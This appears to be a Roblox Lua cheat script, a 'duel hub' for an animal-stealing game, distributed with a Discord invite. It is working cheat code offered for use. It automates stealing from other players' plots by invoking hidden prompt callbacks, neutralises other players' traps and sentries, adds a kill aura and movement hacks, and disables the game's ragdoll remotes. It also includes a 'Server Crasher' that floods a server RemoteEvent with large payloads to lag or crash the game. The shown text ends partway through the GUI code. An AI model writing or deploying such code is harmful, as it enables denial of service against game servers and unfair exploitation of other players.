
-- https://discord.gg/MT6BXdH9q


--[[
    ULTIMATE DUEL HUB (HYDRA EDITION)
    - Auto Duel (Pathfinding)
    - Auto Hit (Kill Aura)
    - Instant Grab (Silent Logic + Visuals)
    - Anti Trap (ALWAYS ON)
    - Anti Sentry (ALWAYS ON)
    - Anti Ragdoll (Exact Logic)
    - Slow Mo / Slow Fall
    - Tall Jump
    - Server Crasher (Exact Lierz Logic @ MAX)
]]

local CONFIG = {
    AUTO_STEAL_NEAREST = false,
    AUTO_DUEL = false,
    AUTO_HIT = false,
    ANTI_RAGDOLL = false,
    SLOW_MO = false,
    TALL_JUMP = false,
    SERVER_CRASHER = false,
    
    -- Always ON Features
    ANTI_TRAP = true,
    ANTI_SENTRY = true
}

local Players = game:GetService("Players")
local RunService = game:GetService("RunService")
local ReplicatedStorage = game:GetService("ReplicatedStorage")
local TweenService = game:GetService("TweenService")
local UserInputService = game:GetService("UserInputService")
local Workspace = game:GetService("Workspace")

local LocalPlayer = Players.LocalPlayer
local PlayerGui = LocalPlayer:WaitForChild("PlayerGui")

-- ==============================================================================
-- 1. ALWAYS ON: ANTI TRAP
-- ==============================================================================
local processedTraps = {}
local BARRIER_OFFSET = 3

local function createTrapBarrier(trapModel)
    if processedTraps[trapModel] then return end
    task.wait(0.5) 
    if not trapModel.Parent then return end

    processedTraps[trapModel] = true
    local cf, size = trapModel:GetBoundingBox()
    
    local barrier = Instance.new("Part")
    barrier.Name = "TrapBarrier"
    barrier.Size = size + Vector3.new(BARRIER_OFFSET * 2, size.Y + 5, BARRIER_OFFSET * 2)
    barrier.CFrame = cf
    barrier.Anchored = true
    barrier.CanCollide = true  
    barrier.Transparency = 0.8  
    barrier.Material = Enum.Material.ForceField
    barrier.Color = Color3.fromRGB(0, 255, 255)
    barrier.CanQuery = false
    barrier.CanTouch = false
    barrier.Parent = Workspace 

    local highlight = Instance.new("Highlight")
    highlight.Adornee = barrier
    highlight.FillColor = Color3.fromRGB(0, 255, 255)
    highlight.OutlineColor = Color3.fromRGB(0, 255, 255)
    highlight.Parent = barrier
    
    for _, part in pairs(trapModel:GetDescendants()) do
        if part:IsA("BasePart") and part ~= barrier then
            part.CanCollide = false
            part.CanTouch = false
            part.Transparency = 0.8
        end
        if part:IsA("TouchTransmitter") or part:IsA("Script") or part:IsA("LocalScript") then
            part:Destroy()
        end
    end
    
    trapModel.AncestryChanged:Connect(function(_, parent)
        if not parent then
            processedTraps[trapModel] = nil
            if barrier and barrier.Parent then barrier:Destroy() end
        end
    end)
end

local function scanForTraps()
    for _, obj in pairs(Workspace:GetDescendants()) do
        if obj:IsA("Model") and (obj.Name == "Trap" or obj.Name:lower():find("trap")) then
            createTrapBarrier(obj)
        end
    end
end

Workspace.DescendantAdded:Connect(function(obj)
    if obj:IsA("Model") and (obj.Name == "Trap" or obj.Name:lower():find("trap")) then
        createTrapBarrier(obj)
    end
end)

task.spawn(function()
    while task.wait(5) do scanForTraps() end
end)

-- ==============================================================================
-- 2. ALWAYS ON: ANTI SENTRY
-- ==============================================================================
local SENTRY_DETECTION_DIST = 60
local sentryTarget = nil

local function getWeapon()
    local char = LocalPlayer.Character
    if not char then return nil end
    return LocalPlayer.Backpack:FindFirstChild("Bat") or char:FindFirstChild("Bat")
end

local function findSentryTarget()
    local char = LocalPlayer.Character
    if not char or not char:FindFirstChild("HumanoidRootPart") then return end
    local rootPos = char.HumanoidRootPart.Position

    for _, obj in pairs(Workspace:GetChildren()) do
        if obj.Name:find("Sentry") and not obj.Name:lower():find("bullet") then
            local ownerId = obj.Name:match("Sentry_(%d+)")
            if ownerId and tonumber(ownerId) == LocalPlayer.UserId then continue end

            local part = obj:IsA("BasePart") and obj or (obj:IsA("Model") and (obj.PrimaryPart or obj:FindFirstChildWhichIsA("BasePart")))
            if part and (rootPos - part.Position).Magnitude <= SENTRY_DETECTION_DIST then
                return obj
            end
        end
    end
    return nil
end

local function attackSentry()
    local char = LocalPlayer.Character
    if not char then return end
    local weapon = getWeapon()
    if not weapon then return end
    local hum = char:FindFirstChildOfClass("Humanoid")
    if weapon.Parent == LocalPlayer.Backpack and hum then hum:EquipTool(weapon) end
    weapon:Activate()
    for _, r in pairs(weapon:GetDescendants()) do
        if r:IsA("RemoteEvent") then pcall(function() r:FireServer() end) end
    end
end

local function manipulateSentry(obj)
    local char = LocalPlayer.Character
    if not char or not char:FindFirstChild("HumanoidRootPart") then return end
    local root = char.HumanoidRootPart
    local cf = root.CFrame * CFrame.new(0, 0, -5)
    
    if obj:IsA("BasePart") then
        obj.CanCollide = false
        obj.CFrame = cf
    elseif obj:IsA("Model") then
        local main = obj.PrimaryPart or obj:FindFirstChildWhichIsA("BasePart")
        if main then
            main.CanCollide = false
            main.CFrame = cf
        end
        for _, p in pairs(obj:GetDescendants()) do
            if p:IsA("BasePart") then p.CanCollide = false end
        end
    end
end

RunService.Heartbeat:Connect(function()
    if sentryTarget and sentryTarget.Parent == Workspace then
        manipulateSentry(sentryTarget)
        attackSentry()
    else
        sentryTarget = findSentryTarget()
    end
end)

-- ==============================================================================
-- 3. ANTI RAGDOLL (EXACT LOGIC)
-- ==============================================================================
local Frozen = false
local DisabledRemotes = {}
local RemoteWatcher = nil
local BlockedStates = {
    [Enum.HumanoidStateType.Ragdoll] = true,
    [Enum.HumanoidStateType.FallingDown] = true,
    [Enum.HumanoidStateType.Physics] = true,
    [Enum.HumanoidStateType.Dead] = true
}
local RemoteKeywords = { "useitem", "combatservice", "ragdoll" }

local function ForceNormal(character)
    local hum = character:FindFirstChildOfClass("Humanoid")
    local hrp = character:FindFirstChild("HumanoidRootPart")
    if not hum or not hrp then return end
    hum.Health = hum.MaxHealth
    hum:ChangeState(Enum.HumanoidStateType.RunningNoPhysics)
    if not Frozen then
        Frozen = true
        hrp.Anchored = true
        hrp.AssemblyLinearVelocity = Vector3.zero
        hrp.AssemblyAngularVelocity = Vector3.zero
        hrp.CFrame += Vector3.new(0, 1.5, 0)
    end
end

local function Release(character)
    local hrp = character:FindFirstChild("HumanoidRootPart")
    if hrp and Frozen then
        hrp.Anchored = false
        Frozen = false
    end
end

local function RestoreMotors(character)
    for _, v in ipairs(character:GetDescendants()) do
        if v:IsA("Motor6D") then v.Enabled = true elseif v:IsA("Constraint") then v.Enabled = false end
    end
end

local function KillRemote(remote)
    if not getconnections or not remote:IsA("RemoteEvent") then return end
    if DisabledRemotes[remote] then return end
    local name = remote.Name:lower()
    for _, key in ipairs(RemoteKeywords) do
        if name:find(key) then
            DisabledRemotes[remote] = {}
            for _, c in ipairs(getconnections(remote.OnClientEvent)) do
                if c.Disable then c:Disable() table.insert(DisabledRemotes[remote], c) end
            end
            break
        end
    end
end

local function InitAntiRagdoll(character)
    local hum = character:WaitForChild("Humanoid", 10)
    if not hum then return end
    for state in pairs(BlockedStates) do hum:SetStateEnabled(state, false) end
    hum.StateChanged:Connect(function(_, new)
        if CONFIG.ANTI_RAGDOLL and BlockedStates[new] then ForceNormal(character) RestoreMotors(character) end
    end)
    RunService.Stepped:Connect(function()
        if not CONFIG.ANTI_RAGDOLL then Release(character) return end
        if BlockedStates[hum:GetState()] then ForceNormal(character) else Release(character) end
        hum.Health = hum.MaxHealth
    end)
end

local function InitAntiItem()
    task.spawn(function()
        local PlayerModule = LocalPlayer:WaitForChild("PlayerScripts"):WaitForChild("PlayerModule", 10)
        if PlayerModule then
            local s, pm = pcall(require, PlayerModule)
            if s and pm and pm.GetControls then
                pm:GetControls():Enable()
            end
        end
    end)
    
    for _, obj in ipairs(ReplicatedStorage:GetDescendants()) do KillRemote(obj) end
    if RemoteWatcher then RemoteWatcher:Disconnect() end
    RemoteWatcher = ReplicatedStorage.DescendantAdded:Connect(KillRemote)
end

local function StartAntiRagdoll() 
    if LocalPlayer.Character then 
        InitAntiRagdoll(LocalPlayer.Character) 
    end 
    InitAntiItem() 
end

local function StopAntiRagdoll()
    for remote, connections in pairs(DisabledRemotes) do 
        for _, conn in ipairs(connections) do 
            if conn.Enable then conn:Enable() end 
        end 
    end
    DisabledRemotes = {}
    if RemoteWatcher then RemoteWatcher:Disconnect() RemoteWatcher = nil end
    if LocalPlayer.Character and Frozen then Release(LocalPlayer.Character) end
end

-- ==============================================================================
-- 4. SLOW MO (SLOW FALL)
-- ==============================================================================
local SlowFallForce = nil
local SlowFallAttachment = nil

local function applySlowFall(enabled)
    if enabled then
        if SlowFallForce then SlowFallForce:Destroy() SlowFallForce = nil end
        if SlowFallAttachment then SlowFallAttachment:Destroy() SlowFallAttachment = nil end
       
        if not LocalPlayer.Character then LocalPlayer.CharacterAdded:Wait() end
        local char = LocalPlayer.Character
        local root = char:FindFirstChild("HumanoidRootPart")
        if not root then return end
       
        SlowFallAttachment = Instance.new("Attachment", root)
        SlowFallForce = Instance.new("VectorForce", root)
        SlowFallForce.Name = "DragonSlowFall"
        SlowFallForce.Attachment0 = SlowFallAttachment
        SlowFallForce.RelativeTo = Enum.ActuatorRelativeTo.World
        SlowFallForce.Enabled = true
       
        task.spawn(function()
            while SlowFallForce and SlowFallForce.Parent and CONFIG.SLOW_MO do
                if root.AssemblyLinearVelocity.Y < -2 then
                    local totalMass = 0
                    for _, part in pairs(char:GetDescendants()) do
                        if part:IsA("BasePart") then totalMass = totalMass + part:GetMass() end
                    end
                    SlowFallForce.Force = Vector3.new(0, totalMass * Workspace.Gravity * 0.92, 0)
                else
                    SlowFallForce.Force = Vector3.zero
                end
                task.wait(0.05)
            end
        end)
    else
        if SlowFallForce then SlowFallForce:Destroy() SlowFallForce = nil end
        if SlowFallAttachment then SlowFallAttachment:Destroy() SlowFallAttachment = nil end
    end
end

-- ==============================================================================
-- 5. TALL JUMP
-- ==============================================================================
local lastJumpTime = 0
local jumpCooldown = 0.5
UserInputService.JumpRequest:Connect(function()
    if CONFIG.TALL_JUMP and LocalPlayer.Character then
        local currentTime = tick()
        if currentTime - lastJumpTime > jumpCooldown then
            local root = LocalPlayer.Character:FindFirstChild("HumanoidRootPart")
            if root then 
                root.AssemblyLinearVelocity = Vector3.new(root.AssemblyLinearVelocity.X, 86, root.AssemblyLinearVelocity.Z) 
                lastJumpTime = currentTime 
            end
        end
    end
end)

-- ==============================================================================
-- 6. SERVER CRASHER (LIERZ LOGIC EXACT @ MAX)
-- ==============================================================================
local lagPackets = 50 -- MAX
local uuid = "d80e2217-36b8-4bdc-9a46-2281c6f70b28"
local bigPayload = string.rep("z", 30000)
local targetRemote
for _, v in pairs(game:GetDescendants()) do 
    if v:IsA("RemoteEvent") and v.Name ~= "friendmain" and v.Name ~= "ping" then 
        targetRemote = v 
        break 
    end 
end
local lastBurst = 0

RunService.Heartbeat:Connect(function()
    if not CONFIG.SERVER_CRASHER or not targetRemote then return end
    
    if tick() - lastBurst < 0.08 then return end
    lastBurst = tick()

    if LocalPlayer:GetNetworkPing() > 0.25 then return end

    for i = 1, lagPackets do
        pcall(function()
            targetRemote:FireServer(uuid, bigPayload)
        end)
    end
end)

-- ==============================================================================
-- 7. AUTO HIT LOGIC
-- ==============================================================================
task.spawn(function()
    while true do
        if CONFIG.AUTO_HIT then
            local char = LocalPlayer.Character
            if char then
                local hum = char:FindFirstChild("Humanoid")
                if hum and hum.Health > 0 then
                    local tool = char:FindFirstChildOfClass("Tool")
                    if not tool then
                        tool = LocalPlayer.Backpack:FindFirstChildOfClass("Tool")
                        if tool then hum:EquipTool(tool) end
                    end
                    if tool then tool:Activate() end
                end
            end
        end
        task.wait(0.1)
    end
end)

-- ==============================================================================
-- 8. AUTO DUEL PATHFINDING
-- ==============================================================================
local path = {}
local pathIndex = 1
local isMoving = false
local moveConn
local waitingGrab = false
local grabDone = false

local function startDuelMovement()
    local root = LocalPlayer.Character and LocalPlayer.Character:FindFirstChild("HumanoidRootPart")
    if not root then return end
    
    isMoving = true
    grabDone = false
    
    if (root.Position - Vector3.new(-475,-7,96)).Magnitude > (root.Position - Vector3.new(-474,-7,23)).Magnitude then
        path = {{position=Vector3.new(-475,-7,96),speed=59},{position=Vector3.new(-483,-5,95),speed=59},{position=Vector3.new(-487,-5,95),speed=55},{position=Vector3.new(-492,-5,95),speed=55},{position=Vector3.new(-473,-7,95),speed=29},{position=Vector3.new(-473,-7,11),speed=29}}
    else
        path = {{position=Vector3.new(-474,-7,23),speed=55},{position=Vector3.new(-484,-5,24),speed=55},{position=Vector3.new(-488,-5,24),speed=55},{position=Vector3.new(-493,-5,25),speed=55},{position=Vector3.new(-473,-7,25),speed=29},{position=Vector3.new(-474,-7,112),speed=29}}
    end
    
    pathIndex = 1
    if moveConn then moveConn:Disconnect() end
    moveConn = RunService.Stepped:Connect(function()
        if not CONFIG.AUTO_DUEL or not isMoving then return end
        
        if waitingGrab then
            if not CONFIG.AUTO_STEAL_NEAREST then CONFIG.AUTO_STEAL_NEAREST = true end
            task.wait(0.5)
            grabDone = true
            waitingGrab = false
            return
        end
        
        local char = LocalPlayer.Character
        local root = char and char:FindFirstChild("HumanoidRootPart")
        if not root then return end
        
        local wp = path[pathIndex]
        if not wp then isMoving = false return end
        
        if (root.Position - wp.position).Magnitude < 5 then
            if (pathIndex == 4 or pathIndex == 6) and not grabDone then
                waitingGrab = true
                root.Velocity = Vector3.zero
                task.delay(1.0, function() grabDone = true waitingGrab = false end)
                return
            end
            if pathIndex == #path then pathIndex = 1 grabDone = false else pathIndex = pathIndex + 1 end
        else
            local dir = (wp.position - root.Position).Unit
            root.Velocity = Vector3.new(dir.X * wp.speed, root.Velocity.Y, dir.Z * wp.speed)
        end
    end)
end

-- ==============================================================================
-- 9. INSTANT GRAB (Silent_ Logic Exact)
-- ==============================================================================
local AnimalsData = require(ReplicatedStorage:WaitForChild("Datas"):WaitForChild("Animals"))

local allAnimalsCache = {}
local PromptMemoryCache = {}
local InternalStealCache = {}
local LastTargetUID = nil
local LastPlayerPosition = nil
local PlayerVelocity = Vector3.zero

local AUTO_STEAL_PROX_RADIUS = 20
local IsStealing = false
local StealProgress = 0
local CurrentStealTarget = nil
local StealStartTime = 0

local CIRCLE_RADIUS = AUTO_STEAL_PROX_RADIUS
local PART_THICKNESS = 0.3
local PART_HEIGHT = 0.2
local PART_COLOR = Color3.fromRGB(0, 255, 255) -- Hydra Cyan
local PartsCount = 65
local circleParts = {}
local circleEnabled = true

local stealConnection = nil
local velocityConnection = nil

local function getHRP()
    local char = LocalPlayer.Character
    if not char then return nil end
    return char:FindFirstChild("HumanoidRootPart") or char:FindFirstChild("UpperTorso")
end

local function isMyBase(plotName)
    local plot = workspace.Plots:FindFirstChild(plotName)
    if not plot then return false end
    
    local sign = plot:FindFirstChild("PlotSign")
    if sign then
        local yourBase = sign:FindFirstChild("YourBase")
        if yourBase and yourBase:IsA("BillboardGui") then
            return yourBase.Enabled == true
        end
    end
    return false
end

local function scanSinglePlot(plot)
    if not plot or not plot:IsA("Model") then return end
    if isMyBase(plot.Name) then return end
    
    local podiums = plot:FindFirstChild("AnimalPodiums")
    if not podiums then return end
    
    for _, podium in ipairs(podiums:GetChildren()) do
        if podium:IsA("Model") and podium:FindFirstChild("Base") then
            local animalName = "Unknown"
            local spawn = podium.Base:FindFirstChild("Spawn")
            if spawn then
                for _, child in ipairs(spawn:GetChildren()) do
                    if child:IsA("Model") and child.Name ~= "PromptAttachment" then
                        animalName = child.Name
                        local animalInfo = AnimalsData[animalName]
                        if animalInfo and animalInfo.DisplayName then
                            animalName = animalInfo.DisplayName
                        end
                        break
                    end
                end
            end
            
            table.insert(allAnimalsCache, {
                name = animalName,
                plot = plot.Name,
                slot = podium.Name,
                worldPosition = podium:GetPivot().Position,
                uid = plot.Name .. "_" .. podium.Name,
            })
        end
    end
end

local function initializeScanner()
    task.wait(2)
    local plots = workspace:WaitForChild("Plots", 10)
    if not plots then return end
    
    for _, plot in ipairs(plots:GetChildren()) do
        if plot:IsA("Model") then
            scanSinglePlot(plot)
        end
    end
    
    plots.ChildAdded:Connect(function(plot)
        if plot:IsA("Model") then
            task.wait(0.5)
            scanSinglePlot(plot)
        end
    end)
    
    task.spawn(function()
        while task.wait(5) do
            allAnimalsCache = {}
            for _, plot in ipairs(plots:GetChildren()) do
                if plot:IsA("Model") then
                    scanSinglePlot(plot)
                end
            end
        end
    end)
end

local function findProximityPromptForAnimal(animalData)
    if not animalData then return nil end
    local cachedPrompt = PromptMemoryCache[animalData.uid]
    if cachedPrompt and cachedPrompt.Parent then return cachedPrompt end
    
    local plot = workspace.Plots:FindFirstChild(animalData.plot)
    if not plot then return nil end
    
    local podiums = plot:FindFirstChild("AnimalPodiums")
    if not podiums then return nil end
    
    local podium = podiums:FindFirstChild(animalData.slot)
    if not podium then return nil end
    
    local base = podium:FindFirstChild("Base")
    if not base then return nil end
    
    local spawn = base:FindFirstChild("Spawn")
    if not spawn then return nil end
    
    local attach = spawn:FindFirstChild("PromptAttachment")
    if not attach then return nil end
    
    for _, p in ipairs(attach:GetChildren()) do
        if p:IsA("ProximityPrompt") then
            PromptMemoryCache[animalData.uid] = p
            return p
        end
    end
    return nil
end

local function updatePlayerVelocity()
    local hrp = getHRP()
    if not hrp then return end
    local currentPos = hrp.Position
    if LastPlayerPosition then
        PlayerVelocity = (currentPos - LastPlayerPosition) / task.wait()
    end
    LastPlayerPosition = currentPos
end

local function shouldSteal(animalData)
    if not animalData or not animalData.worldPosition then return false end
    local hrp = getHRP()
    if not hrp then return false end
    local currentDistance = (hrp.Position - animalData.worldPosition).Magnitude
    return currentDistance <= AUTO_STEAL_PROX_RADIUS
end

local function buildStealCallbacks(prompt)
    if InternalStealCache[prompt] then return end
    local data = {
        holdCallbacks = {},
        triggerCallbacks = {},
        ready = true,
    }
    local ok1, conns1 = pcall(getconnections, prompt.PromptButtonHoldBegan)
    if ok1 and type(conns1) == "table" then
        for _, conn in ipairs(conns1) do
            if type(conn.Function) == "function" then
                table.insert(data.holdCallbacks, conn.Function)
            end
        end
    end
    local ok2, conns2 = pcall(getconnections, prompt.Triggered)
    if ok2 and type(conns2) == "table" then
        for _, conn in ipairs(conns2) do
            if type(conn.Function) == "function" then
                table.insert(data.triggerCallbacks, conn.Function)
            end
        end
    end
    if (#data.holdCallbacks > 0) or (#data.triggerCallbacks > 0) then
        InternalStealCache[prompt] = data
    end
end

local function executeInternalStealAsync(prompt, animalData)
    local data = InternalStealCache[prompt]
    if not data or not data.ready then return false end
    
    data.ready = false
    IsStealing = true
    StealProgress = 0
    CurrentStealTarget = animalData
    StealStartTime = tick()
    
    task.spawn(function()
        if #data.holdCallbacks > 0 then
            for _, fn in ipairs(data.holdCallbacks) do task.spawn(fn) end
        end
        
        local startTime = tick()
        while tick() - startTime < 1.3 do
            StealProgress = (tick() - startTime) / 1.3
            task.wait(0.05)
        end
        StealProgress = 1
        
        if #data.triggerCallbacks > 0 then
            for _, fn in ipairs(data.triggerCallbacks) do task.spawn(fn) end
        end
        
        task.wait(0.1)
        data.ready = true
        task.wait(0.3)
        IsStealing = false
        StealProgress = 0
        CurrentStealTarget = nil
    end)
    return true
end

local function attemptSteal(prompt, animalData)
    if not prompt or not prompt.Parent then return false end
    buildStealCallbacks(prompt)
    if not InternalStealCache[prompt] then return false end
    return executeInternalStealAsync(prompt, animalData)
end

local function getNearestAnimal()
    local hrp = getHRP()
    if not hrp then return nil end
    local nearest = nil
    local minDist = math.huge
    for _, animalData in ipairs(allAnimalsCache) do
        if isMyBase(animalData.plot) then continue end
        if animalData.worldPosition then
            local dist = (hrp.Position - animalData.worldPosition).Magnitude
            if dist < minDist then
                minDist = dist
                nearest = animalData
            end
        end
    end
    return nearest
end

local function autoStealLoop()
    if stealConnection then stealConnection:Disconnect() end
    if velocityConnection then velocityConnection:Disconnect() end
    velocityConnection = RunService.Heartbeat:Connect(updatePlayerVelocity)
    stealConnection = RunService.Heartbeat:Connect(function()
        if not CONFIG.AUTO_STEAL_NEAREST then return end
        if IsStealing then return end
        
        local targetAnimal = getNearestAnimal()
        if not targetAnimal then return end
        if not shouldSteal(targetAnimal) then return end
        
        if LastTargetUID ~= targetAnimal.uid then LastTargetUID = targetAnimal.uid end
        
        local prompt = PromptMemoryCache[targetAnimal.uid]
        if not prompt or not prompt.Parent then
            prompt = findProximityPromptForAnimal(targetAnimal)
        end
        
        if prompt then attemptSteal(prompt, targetAnimal) end
    end)
end

-- Visual Circle
local function createCircle(character)
    for _, part in ipairs(circleParts) do if part then part:Destroy() end end
    circleParts = {}
    CIRCLE_RADIUS = AUTO_STEAL_PROX_RADIUS
    local root = character:WaitForChild("HumanoidRootPart")
    
    local points = {}
    for i = 0, PartsCount - 1 do
        local angle = math.rad(i * 360 / PartsCount)
        table.insert(points, Vector3.new(math.cos(angle), 0, math.sin(angle)) * CIRCLE_RADIUS)
    end
    
    for i = 1, #points do
        local nextIndex = i % #points + 1
        local p1 = points[i]
        local p2 = points[nextIndex]
        local part = Instance.new("Part")
        part.Anchored = true
        part.CanCollide = false
        part.Size = Vector3.new((p2 - p1).Magnitude, PART_HEIGHT, PART_THICKNESS)
        part.Color = PART_COLOR
        part.Material = Enum.Material.Neon
        part.Transparency = 0.3
        part.TopSurface = Enum.SurfaceType.Smooth
        part.BottomSurface = Enum.SurfaceType.Smooth
        part.Parent = workspace
        table.insert(circleParts, part)
    end
end

local function updateCircle(character)
    local root = character:FindFirstChild("HumanoidRootPart")
    if not root then return end
    local points = {}
    for i = 0, PartsCount - 1 do
        local angle = math.rad(i * 360 / PartsCount)
        table.insert(points, Vector3.new(math.cos(angle), 0, math.sin(angle)) * CIRCLE_RADIUS)
    end
    for i, part in ipairs(circleParts) do
        local nextIndex = i % #points + 1
        local p1 = points[i]
        local p2 = points[nextIndex]
        local center = (p1 + p2) / 2 + root.Position
        part.CFrame = CFrame.new(center, center + Vector3.new(p2.X - p1.X, 0, p2.Z - p1.Z)) * CFrame.Angles(0, math.pi/2, 0)
    end
end

local function onCharacterAdded(character)
    if circleEnabled then
        createCircle(character)
        RunService:BindToRenderStep("CircleFollow", Enum.RenderPriority.Camera.Value + 1, function()
            updateCircle(character)
        end)
    end
end

local function updateCircleRadius()
    CIRCLE_RADIUS = AUTO_STEAL_PROX_RADIUS
    local character = LocalPlayer.Character
    if character and circleEnabled then createCircle(character) end
end

-- ==============================================================================
-- 10. UNIFIED GUI (BLUE/CYAN HYDRA THEME)
-- ==============================================================================
local ScreenGui = Instance.new("ScreenGui")
ScreenGui.Name = "HydraHubBlue"
ScreenGui.ResetOnSpawn = false
ScreenGui.Parent = game.CoreGui

local MainFrame = Instance.new("Frame")
MainFrame.Name = "Main"
MainFrame.Size = UDim2.new(0, 320, 0, 520)
MainFrame.Position = UDim2.new(0.5, -160, 0.5, -260)
MainFrame.BackgroundColor3 = Color3.fromRGB(15, 20, 30)
MainFrame.BackgroundTransparency = 0.3
MainFrame.BorderSizePixel = 0
MainFrame.Active = true
MainFrame.Draggable = true
MainFrame.Parent = ScreenGui

local MainCorner = Instance.new("UICorner")
MainCorner.CornerRadius = UDim.new(0, 20)
MainCorner.Parent = MainFrame

local MainStroke = Instance.new("UIStroke")
MainStroke.Color = Color3.fromRGB(255, 0, 0)
MainStroke.Thickness = 2.5
MainStroke.Parent = MainFrame

local MainGradient = Instance.new("UIGradient")
MainGradient.Color = ColorSequence.new{
	ColorSequenceKeypoint.new(0, Color3.fromRGB(255, 0, 0)),
	ColorSequenceKeypoint.new(0.5, Color3.fromRGB(150, 0, 0)),
	ColorSequenceKeypoint.new(1, Color3.fromRGB(255, 0, 0))
}
MainGradient.Parent = MainStroke

task.spawn(function()
    while true do
        MainGradient.Rotation = MainGradient.Rotation + 1
        task.wait(0.02)
    end
end)

local Title = Instance.new("TextLabel")
Title.Size = UDim2.new(1, 0, 0, 50)
Title.BackgroundTransparency = 1
Title.Text = "Catty hub"
Title.TextColor3 = Color3.fromRGB(255, 0, 0)
Title.TextSize = 28
Title.Font = Enum.Font.SourceSansBold
Title.Parent = MainFrame

local Divider = Instance.new("Frame")
Divider.Size = UDim2.new(0.9, 0, 0, 2)
Divider.Position = UDim2.new(0.05, 0, 0, 50)
Divider.BackgroundColor3 = Color3.fromRGB(255, 0, 0)
Divider.BackgroundTransparency = 0.5
Divider.BorderSizePixel = 0
Divider.Parent = MainFrame

local Scroll = Instance.new("ScrollingFrame")
Scroll.Size = UDim2.new(1, 0, 1, -60)
Scroll.Position = UDim2.new(0, 0, 0, 60)
Scroll.BackgroundTransparency = 1
Scroll.BorderSizePixel = 0
Scroll.ScrollBarThickness = 4
Scroll.Parent = MainFrame

local UIList = Instance.new("UIListLayout")
UIList.Parent = Scroll
UIList.SortOrder = Enum.SortOrder.LayoutOrder
UIList.Padding = UDim.new(0, 8)
UIList.HorizontalAlignment = Enum.HorizontalAlignment.Center

-- Button Creator
local function createButton(text, defaultState, callback)
    local btnContainer = Instance.new("Frame")
    btnContainer.Size = UDim2.new(0.9, 0, 0, 40)
    btnContainer.BackgroundTransparency = 1
    btnContainer.Parent = Scroll

    local btn = Instance.new("TextButton")
    btn.Size = UDim2.new(1, 0, 1, 0)
    btn.BackgroundColor3 = defaultState and Color3.fromRGB(150, 0, 0) or Color3.fromRGB(20, 30, 40)
    btn.BackgroundTransparency = 0.2
    btn.Text = text .. (defaultState and ": ON" or ": OFF")
    btn.TextColor3 = Color3.fromRGB(255, 0, 0)
    btn.TextSize = 16
    btn.Font = Enum.Font.SourceSansBold
    btn.Parent = btnContainer
    
    local corner = Instance.new("UICorner")
    corner.CornerRadius = UDim.new(0, 10)
    corner.Parent = btn
    
    local stroke = Instance.new("UIStroke")
    stroke.Color = Color3.fromRGB(255, 0, 0)
    stroke.Thickness = 1.5
    stroke.Transparency = 0.2
    stroke.Parent = btn
    
    btn.MouseButton1Click:Connect(function()
        local newState = callback()
        btn.Text = text .. (newState and ": ON" or ": OFF")
        btn.BackgroundColor3 = newState and Color3.fromRGB(0, 100, 150) or Color3.fromRGB(20, 30, 40)
    end)
end

-- Feature Buttons
createButton("AUTO GRAB", false, function()
    CONFIG.AUTO_STEAL_NEAREST = not CONFIG.AUTO_STEAL_NEAREST
    return CONFIG.AUTO_STEAL_NEAREST
end)

createButton("AUTO DUEL", false, function()
    CONFIG.AUTO_DUEL = not CONFIG.AUTO_DUEL
    if CONFIG.AUTO_DUEL then startDuelMovement() else isMoving = false end
    return CONFIG.AUTO_DUEL
end)

createButton("AUTO HIT", false, function()
    CONFIG.AUTO_HIT = not CONFIG.AUTO_HIT
    return CONFIG.AUTO_HIT
end)

createButton("ANTI RAGDOLL", false, function()
    CONFIG.ANTI_RAGDOLL = not CONFIG.ANTI_RAGDOLL
    if CONFIG.ANTI_RAGDOLL then StartAntiRagdoll() else StopAntiRagdoll() end
    return CONFIG.ANTI_RAGDOLL
end)

createButton("SLOW MO", false, function()
    CONFIG.SLOW_MO = not CONFIG.SLOW_MO
    applySlowFall(CONFIG.SLOW_MO)
    return CONFIG.SLOW_MO
end)

createButton("TALL JUMP", false, function()
    CONFIG.TALL_JUMP = not CONFIG.TALL_JUMP
    return CONFIG.TALL_JUMP
end)

createButton("SERVER CRASHER", false, function()
    CONFIG.SERVER_CRASHER = not CONFIG.SERVER_CRASHER
    return CONFIG.SERVER_CRASHER
end)

-- Radius Slider Section
local RadiusLabel = Instance.new("TextLabel")
RadiusLabel.Size = UDim2.new(1, 0, 0, 20)
RadiusLabel.BackgroundTransparency = 1
RadiusLabel.Text = "Grab Radius: 20"
RadiusLabel.TextColor3 = Color3.fromRGB(150, 255, 255)
RadiusLabel.Font = Enum.Font.SourceSans
RadiusLabel.TextSize = 16
RadiusLabel.Parent = Scroll

local SliderBG = Instance.new("Frame")
SliderBG.Size = UDim2.new(0.9, 0, 0, 8)
SliderBG.BackgroundColor3 = Color3.fromRGB(10, 15, 25)
SliderBG.Parent = Scroll
Instance.new("UICorner", SliderBG, {CornerRadius=UDim.new(1,0)})

local SliderFill = Instance.new("Frame")
SliderFill.Size = UDim2.new((20-5)/195, 0, 1, 0)
SliderFill.BackgroundColor3 = Color3.fromRGB(0, 255, 255)
SliderFill.Parent = SliderBG
Instance.new("UICorner", SliderFill, {CornerRadius=UDim.new(1,0)})

local draggingRadius = false
SliderBG.InputBegan:Connect(function(input)
    if input.UserInputType == Enum.UserInputType.MouseButton1 then draggingRadius = true end
end)
UserInputService.InputEnded:Connect(function(input)
    if input.UserInputType == Enum.UserInputType.MouseButton1 then draggingRadius = false end
end)
UserInputService.InputChanged:Connect(function(input)
    if draggingRadius and input.UserInputType == Enum.UserInputType.MouseMovement then
        local relPos = math.clamp((input.Position.X - SliderBG.AbsolutePosition.X) / SliderBG.AbsoluteSize.X, 0, 1)
        SliderFill.Size = UDim2.new(relPos, 0, 1, 0)
        AUTO_STEAL_PROX_RADIUS = math.floor(relPos * 195) + 5
        RadiusLabel.Text = "Grab Radius: " .. AUTO_STEAL_PROX_RADIUS
        updateCircleRadius()
    end
end)

-- Progress Bar
local ProgressLabel = Instance.new("TextLabel")
ProgressLabel.Size = UDim2.new(1, 0, 0, 20)
ProgressLabel.BackgroundTransparency = 1
ProgressLabel.Text = "Steal Progress:"
ProgressLabel.TextColor3 = Color3.fromRGB(150, 255, 255)
ProgressLabel.Font = Enum.Font.SourceSans
ProgressLabel.TextSize = 16
ProgressLabel.Parent = Scroll

local ProgressBG = Instance.new("Frame")
ProgressBG.Size = UDim2.new(0.9, 0, 0, 6)
ProgressBG.BackgroundColor3 = Color3.fromRGB(40, 40, 40)
ProgressBG.BorderSizePixel = 0
ProgressBG.Parent = Scroll
Instance.new("UICorner", ProgressBG, {CornerRadius=UDim.new(1,0)})

local ProgressFill = Instance.new("Frame")
ProgressFill.Size = UDim2.new(0, 0, 1, 0)
ProgressFill.BackgroundColor3 = Color3.fromRGB(0, 128, 255)
